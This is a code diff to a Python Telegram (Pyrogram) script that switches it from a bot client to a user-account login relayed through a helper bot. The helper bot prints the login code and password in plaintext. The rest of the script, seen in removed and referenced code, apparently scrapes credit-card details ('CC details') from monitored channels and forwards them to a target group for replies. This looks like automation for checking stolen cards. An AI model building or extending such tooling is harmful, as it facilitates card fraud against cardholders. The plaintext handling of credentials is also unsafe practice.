@@ -7,10 +7,11 @@ from datetime import datetime
 from pyrogram import Client, filters
 from pyrogram.types import Message
 
-# Environment variables - BOT TOKEN use karo
+# Environment variables
 API_ID = int(os.environ['API_ID'])
 API_HASH = os.environ['API_HASH']
-BOT_TOKEN = os.environ['BOT_TOKEN']  # Bot token from @BotFather
+BOT_TOKEN = os.environ['BOT_TOKEN']  # Bot for receiving codes
+PHONE_NUMBER = os.environ['PHONE_NUMBER']
 TARGET_GROUP = os.environ['TARGET_GROUP']
 
 SOURCE_CHANNELS = [
@@ -24,6 +25,59 @@ NEXT_POST_DELAY = int(os.environ.get('NEXT_POST_DELAY', '10'))
 PROCESSED_FILE = 'processed_messages.json'
 posted_count = 0
 pinned_count = 0
+
+# Store for user inputs
+user_data = {}
+
+# Bot for receiving codes
+bot_app = Client("code_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+
+# User client (with bot help for login)
+user_app = Client(
+    "user_session", 
+    api_id=API_ID, 
+    api_hash=API_HASH,
+    phone_number=PHONE_NUMBER
+)
+
+@bot_app.on_message(filters.private)
+async def handle_private_message(client, message):
+    """Bot ko code/password receive karega"""
+    text = message.text.strip()
+    
+    if message.from_user.id not in user_data:
+        user_data[message.from_user.id] = {'stage': 'waiting'}
+    
+    # Check if it's confirmation code (5 digits)
+    if text.isdigit() and len(text) == 5:
+        print(f"📱 Confirmation code received: {text}")
+        user_data[message.from_user.id]['code'] = text
+        await message.reply("✅ Code received! Processing login...")
+        
+    # Check if it's password
+    elif len(text) > 3:
+        print(f"🔑 Password received: {text}")
+        user_data[message.from_user.id]['password'] = text
+        await message.reply("✅ Password received! Completing login...")
+    
+    else:
+        await message.reply("❌ Invalid input. Send 5-digit code or password.")
+
+async def login_with_bot_help():
+    """Bot se code/password leke login karega"""
+    print("🔐 Waiting for login code via bot...")
+    
+    # Start bot to receive codes
+    await bot_app.start()
+    print("🤖 Bot started for code reception")
+    
+    # Try to start user client (will ask for code)
+    try:
+        await user_app.start()
+        return True
+    except Exception as e:
+        print(f"Login error: {e}")
+        return False
 
 class FileStorage:
     @staticmethod
@@ -170,59 +224,43 @@ async def process_source_channel(client, channel_id):
         print(f"❌ Channel error: {e}")
         return False
 
-# BOT CLIENT - No login required!
-app = Client(
-    "telegram_bot",
-    api_id=API_ID,
-    api_hash=API_HASH,
-    bot_token=BOT_TOKEN  # Bot token se directly login
-)
-
-@app.on_message(filters.chat(SOURCE_CHANNELS))
-async def handle_new_message(client, message):
-    text = message.text or message.caption
-    if not text:
-        return
-    
-    message_signature = f"{message.chat.id}_{message.id}"
-    if is_message_processed(message_signature):
-        return
-    
-    cc_details = extract_cc_details(text)
-    if cc_details:
-        print(f"🆕 New CC: {cc_details}")
-        result = await send_and_wait_for_reply(client, cc_details)
-        mark_message_processed(message_signature, cc_details, result)
-        await asyncio.sleep(NEXT_POST_DELAY)
-
 async def main():
     print("=" * 50)
-    print("🚀 TELEGRAM BOT MONITOR STARTING...")
+    print("🚀 TELEGRAM MONITOR WITH BOT LOGIN HELP")
     print("=" * 50)
-    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
+    print(f"📱 Phone: {PHONE_NUMBER}")
+    print(f"🤖 Bot: @{BOT_TOKEN.split(':')[0]}_bot")
     print(f"🎯 Target: {TARGET_GROUP}")
-    print(f"📡 Channels: {len(SOURCE_CHANNELS)}")
     print("=" * 50)
+    
+    # Step 1: Login with bot help
+    success = await login_with_bot_help()
+    if not success:
+        print("❌ Login failed")
+        return
+    
+    print("✅ User logged in successfully!")
     
     init_storage()
     
-    async with app:
-        print("✅ Bot logged in successfully!")
-        me = await app.get_me()
-        print(f"🤖 Bot: @{me.username}")
+    # Stop bot (no longer needed)
+    await bot_app.stop()
+    
+    async with user_app:
+        me = await user_app.get_me()
+        print(f"👤 User: {me.first_name}")
         
         print("📊 Posted: 0 | Pinned: 0")
         
-        # Cleanup group (bot needs admin rights)
-        await cleanup_group_messages(app)
+        # Cleanup group
+        await cleanup_group_messages(user_app)
         
         # Process existing messages
         for channel_id in SOURCE_CHANNELS:
-            await process_source_channel(app, channel_id)
+            await process_source_channel(user_app, channel_id)
         
         print(f"\n✅ Ready | Posted: {posted_count} | Pinned: {pinned_count}")
         print("🔍 Monitoring for new messages...")
-        print("💡 Press Ctrl+C to stop")
         
         # Keep running
         while True:
